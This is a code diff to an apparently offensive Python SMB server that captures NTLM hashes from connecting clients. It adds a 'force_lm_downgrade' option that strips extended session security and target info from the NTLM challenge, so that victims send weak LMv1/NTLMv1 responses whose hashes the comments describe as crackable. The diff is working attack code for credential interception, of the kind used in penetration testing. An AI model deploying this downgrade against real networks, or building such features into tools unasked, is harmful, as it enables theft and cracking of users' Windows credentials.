@@ -64,6 +64,19 @@ _NTLM_CHALLENGE_FLAGS = (
     0x02000000    # NTLMSSP_NEGOTIATE_VERSION
 )
 
+# Flags advertised when forcing an LM/NTLMv1 downgrade. Dropping
+# EXTENDED_SESSIONSECURITY and TARGET_INFO makes clients fall back to the
+# legacy LMv1/NTLMv1 responses (24-byte LM + NT), exposing a much weaker LM
+# response that can be cracked as an LM hash.
+_NTLM_CHALLENGE_FLAGS_LM_DOWNGRADE = (
+    0x00000001 |  # NTLMSSP_NEGOTIATE_UNICODE
+    0x00000004 |  # NTLMSSP_REQUEST_TARGET
+    0x00000200 |  # NTLMSSP_NEGOTIATE_NTLM
+    0x00008000 |  # NTLMSSP_NEGOTIATE_ALWAYS_SIGN
+    0x00010000 |  # NTLMSSP_TARGET_TYPE_DOMAIN
+    0x02000000    # NTLMSSP_NEGOTIATE_VERSION
+)
+
 
 def _der_len(length):
     """DER-encode an ASN.1 length."""
@@ -109,23 +122,32 @@ def _av_pair(av_id, value):
     return struct.pack("<HH", av_id, len(value)) + value
 
 
-def build_ntlm_challenge(server_challenge, target_name):
+def build_ntlm_challenge(server_challenge, target_name, force_lm=False):
     """Build an NTLMSSP CHALLENGE (Type 2) message.
 
     @param server_challenge: 8-byte server challenge
     @param target_name: NetBIOS/domain name advertised to the client
+    @param force_lm: When True, advertise downgraded flags and omit the target
+                     info so the client replies with a legacy LMv1/NTLMv1
+                     response (lets you capture an LM hash).
     @return: raw NTLMSSP challenge bytes
     """
     target_unicode = target_name.encode("utf-16-le")
 
-    # Target info AV pairs (used by the client to build the NTLMv2 response)
-    av_pairs = (
-        _av_pair(2, target_unicode) +   # MsvAvNbDomainName
-        _av_pair(1, target_unicode) +   # MsvAvNbComputerName
-        _av_pair(4, target_unicode) +   # MsvAvDnsDomainName
-        _av_pair(3, target_unicode) +   # MsvAvDnsComputerName
-        _av_pair(0, b"")                # MsvAvEOL
-    )
+    if force_lm:
+        flags = _NTLM_CHALLENGE_FLAGS_LM_DOWNGRADE
+        # No TargetInfo when forcing the legacy downgrade.
+        av_pairs = b""
+    else:
+        flags = _NTLM_CHALLENGE_FLAGS
+        # Target info AV pairs (used by the client to build the NTLMv2 response)
+        av_pairs = (
+            _av_pair(2, target_unicode) +   # MsvAvNbDomainName
+            _av_pair(1, target_unicode) +   # MsvAvNbComputerName
+            _av_pair(4, target_unicode) +   # MsvAvDnsDomainName
+            _av_pair(3, target_unicode) +   # MsvAvDnsComputerName
+            _av_pair(0, b"")                # MsvAvEOL
+        )
 
     # The payload follows a fixed-size header. The header is 56 bytes when the
     # optional Version field (8 bytes) is included.
@@ -137,7 +159,7 @@ def build_ntlm_challenge(server_challenge, target_name):
     msg += struct.pack("<I", 0x00000002)  # MessageType = CHALLENGE
     # TargetName fields
     msg += struct.pack("<HHI", len(target_unicode), len(target_unicode), target_name_offset)
-    msg += struct.pack("<I", _NTLM_CHALLENGE_FLAGS)
+    msg += struct.pack("<I", flags)
     msg += server_challenge                # ServerChallenge (8 bytes)
     msg += b"\x00" * 8                      # Reserved
     # TargetInfo fields
@@ -333,7 +355,8 @@ class _SMBRequestHandler(BaseRequestHandler):
 
     def _send_challenge(self, message_id, session_id):
         server = self.server.smb_config
-        ntlm = build_ntlm_challenge(server.challenge, server.target_name)
+        ntlm = build_ntlm_challenge(
+            server.challenge, server.target_name, force_lm=server.force_lm_downgrade)
         secbuf = _spnego_negtokenresp(ntlm)
         self._send_session_setup(
             message_id, session_id,
@@ -369,6 +392,7 @@ class SMBServer:
                  target_name="WORKGROUP",
                  log_dir=None,
                  print_smb=False,
+                 force_lm_downgrade=False,
                  capture_callback=None):
         """
         @param listen_address: IP address to bind to
@@ -378,6 +402,9 @@ class SMBServer:
         @param target_name: NetBIOS/domain name advertised to the client
         @param log_dir: Directory to append captured hashes to (smb_credentials.log)
         @param print_smb: Print SMB protocol activity
+        @param force_lm_downgrade: Advertise downgraded NTLM flags to force
+                          clients into a legacy LMv1/NTLMv1 response (captures
+                          a weaker LM hash).
         @param capture_callback: Optional callable(client_ip, result_dict)
         """
         self.listen_address = listen_address
@@ -385,6 +412,7 @@ class SMBServer:
         self.target_name = target_name
         self.log_dir = log_dir
         self.print_smb = print_smb
+        self.force_lm_downgrade = force_lm_downgrade
         self.capture_callback = capture_callback
         self.server_guid = os.urandom(16)
 
@@ -413,6 +441,8 @@ class SMBServer:
         print("[SMB] SMB server started on %s:%d" % (self.listen_address, self.listen_port))
         print("[SMB] Advertising target name: %s" % self.target_name)
         print("[SMB] Server challenge: %s" % binascii.hexlify(self.challenge).decode("ascii"))
+        if self.force_lm_downgrade:
+            print("[SMB] Force LM downgrade enabled: requesting legacy LMv1/NTLMv1 responses")
 
     def stop(self):
         """Stop the SMB server."""
